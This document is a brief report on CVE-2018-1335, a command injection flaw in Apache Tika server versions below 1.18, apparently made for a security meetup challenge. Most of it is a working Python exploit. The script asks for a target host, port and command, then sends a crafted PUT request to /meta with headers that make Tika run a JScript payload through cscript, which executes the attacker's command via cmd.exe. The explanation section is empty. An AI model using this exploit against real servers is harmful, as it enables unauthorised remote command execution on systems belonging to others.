<div align="center"><h1>CVE-2018-1335 REPORT</h1></div>

## About the vulnerability

This vulnerability leads to command injection vulnerability in Apache Tika server uses Cscript.exe to execute Jscript or VBS code and run arbitary commands.

**On versions:** Apache Tika server <1.18

**Pre-requisites:** No pre-requisites. Run the Tika server in its default configuration.

## Explanation

## Exploit
```
#!/usr/bin/python

import requests

host = input("=> Target website/IP address = ")
port = input("=> Port number = ")
command = input("=> Command = ")

url = "http://"+host+':'+port+'/meta'

header = {"X-Tika-OCRTesseractPath": "\"cscript\"", "X-Tika-OCRLanguage": "//E:Jscript", "Content-type": "image/jp2"}

script = '''WScript.CreateObject("WScript.Shell").Run("cmd.exe /k %s")'''%command

requests.put(url, headers=header, data = script)
```
[Exploit code link](https://github.com/yash-bansod/Techmeet21-SAPTANG/blob/chall4/chall4/exploit.py)

Exploit was tested on Apache Tika 1.17 with Java version "1.7.0_80".